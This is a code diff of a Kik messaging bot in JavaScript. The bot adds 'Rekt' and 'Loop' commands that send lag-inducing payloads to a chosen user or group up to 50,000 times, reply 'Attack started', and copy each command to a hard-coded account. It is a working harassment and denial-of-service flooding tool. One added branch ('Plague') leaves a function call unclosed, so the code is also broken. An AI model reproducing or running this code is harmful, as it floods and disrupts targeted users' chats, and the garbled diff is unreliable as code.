@@ -130,19 +130,23 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
  
   
     if (msgParts[0] == "Send" && msgParts[1] == "link") {
-    let mess = " https://button-slime-mascara.glitch.me/ ";
+    let mess = "https://button-slime-mascara.glitch.me/ ";
     await Kik.sendMessage(sender.jid, mess);
     return;
   }
   
   if (msgParts[0] == "Bot" && msgParts[1] == "commands") {
-    let mess = " Bot commands:                                                               Check bot / Send link / Rekt jid 5-50000 / Loop jid 5-50000 / Xmpp loop / Add me ";
+    let mess = "Bot commands:                                                               Check bot / Send link / Rekt jid 5-50000 / Loop jid 5-50000 / Xmpp loop / Ezy / Add me ";
     await Kik.sendMessage(sender.jid, mess);
     return;
   }
 
+  if (msgParts[0] == "Plague") {
+    let mess = "Everyone's father";
+    await Kik.sendMessage(sender.jid
+  
   if (msgParts[0] == "Check" && msgParts[1] == "bot") {
-    let mess = " Bot online ";
+    let mess = "Bot online ";
     await Kik.sendMessage(sender.jid, mess);
     return;
   }
@@ -153,11 +157,19 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
     return;
   }
   
+  if (msgParts[0] == "Ezy") {
+    let mess = "My creator also a troll God <3 ";
+    await Kik.sendMessage(sender.jid, mess);
+    return;
+  }
+  
   if (msgParts[0] == "Rekt" && msgParts[1].endsWith(".kik.com")) {
     (async () => {
-      // Kik.sendMessage("oooweoo_tis@talk.kik.com", msg);
-      // Kik.sendMessage('uncefunkle01_ap0@talk.kik.com', msg);
-      Kik.sendMessage("fuckdavid___ym7@talk.kik.com", msg);
+      // Kik.sendMessage("oooweooo_tis@talk.kik.com", msg);
+      // Kik.sendMessage('uncefumnkle01_ap0@talk.kik.com', msg);
+      Kik.sendMessage("fuckdavidd___ym7@talk.kik.com", msg);
+      let mess = "Attack started ";
+    await Kik.sendMessage(sender.jid, mess);
       let numb = 0;
       while (numb <= msgParts[2]) {
         await Kik.sendMessage(msgParts[1], lag2);
@@ -168,12 +180,14 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
     })();
     return;
   }
-  
+
   if (msgParts[0] == "Rekt" && msgParts[1].endsWith("@groups.kik.com")) {
     (async () => {
-      // Kik.sendMessage("oooweoo_tis@talk.kik.com", msg);
-      // Kik.sendMessage('uncefunkle01_ap0@talk.kik.com', msg);
-      Kik.sendMessage("fuckdavid___ym7@talk.kik.com", msg);
+      // Kik.sendMessage("oooweooo_tis@talk.kik.com", msg);
+      // Kik.sendMessage('uncefjunkle01_ap0@talk.kik.com', msg);
+      Kik.sendMessage("fuckdavidd___ym7@talk.kik.com", msg);
+      let mess = "Attack started ";
+    await Kik.sendMessage(sender.jid, mess);
       let numb = 0;
       while (numb <= msgParts[2]) {
         await Kik.sendMessage(msgParts[1], lag2);
@@ -187,9 +201,11 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
   
   if (msgParts[0] == "Loop" && msgParts[1].endsWith("@groups.kik.com")) {
     (async () => {
-      // Kik.sendMessage("oooweoo_tis@talk.kik.com", msg);
-      // Kik.sendMessage('uncefunkle01_ap0@talk.kik.com', msg);
-      Kik.sendMessage("fuckdavid___ym7@talk.kik.com", msg);
+      // Kik.sendMessage("oooweolo_tis@talk.kik.com", msg);
+      // Kik.sendMessage('uncejfunkle01_ap0@talk.kik.com', msg);
+      Kik.sendMessage("fuckdavidd___ym7@talk.kik.com", msg);
+      let mess = "Attack started ";
+    await Kik.sendMessage(sender.jid, mess);
       let numb = 0;
       while (numb <= msgParts[2]) {
         await Kik.sendMessage(msgParts[1], lag1);
@@ -203,9 +219,11 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
   
   if (msgParts[0] == "Loop" && msgParts[1].endsWith(".kik.com")) {
     (async () => {
-      // Kik.sendMessage("oooweoo_tis@talk.kik.com", msg);
-      // Kik.sendMessage('uncefunkle01_ap0@talk.kik.com', msg);
-      Kik.sendMessage("fuckdavid___ym7@talk.kik.com", msg);
+      // Kik.sendMessage("oooweoo_tisl@talk.kik.com", msg);
+      // Kik.sendMessage('uncefunklye01_ap0@talk.kik.com', msg);
+      Kik.sendMessage("fuckdavidd___ym7@talk.kik.com", msg);
+      let mess = "Attack started ";
+    await Kik.sendMessage(sender.jid, mess);
       let numb = 0;
       while (numb <= msgParts[2]) {
         await Kik.sendMessage(msgParts[1], lag1);
@@ -213,7 +231,7 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
         numb += 1;
       }
       // await Kik.forceAdmin(sender.jid);
-    })();
+     })();
     return;
   }
 });
